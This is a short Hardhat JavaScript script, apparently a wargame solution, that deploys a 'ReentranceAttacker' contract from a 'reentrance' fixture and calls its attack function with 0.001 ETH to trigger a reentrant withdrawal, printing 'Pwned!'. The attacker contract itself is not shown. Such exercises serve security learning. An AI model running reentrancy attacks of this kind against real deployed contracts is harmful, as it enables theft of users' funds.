const { deployments, ethers } = require("hardhat")

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  /* Attack deploying a new attacker contract */

  console.log("Deploying attacker contract...")
  await deployments.fixture("reentrance")
  const attacker = await ethers.getContract("ReentranceAttacker", deployer)

  /* Running the attack */

  console.log(
    "Donating 0.001 eth and withdrawing to trigger withdraw again from receive function..."
  )
  const attackTx = await attacker.attack({ value: ethers.utils.parseEther("0.001") })
  attackTx.wait(1)
  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
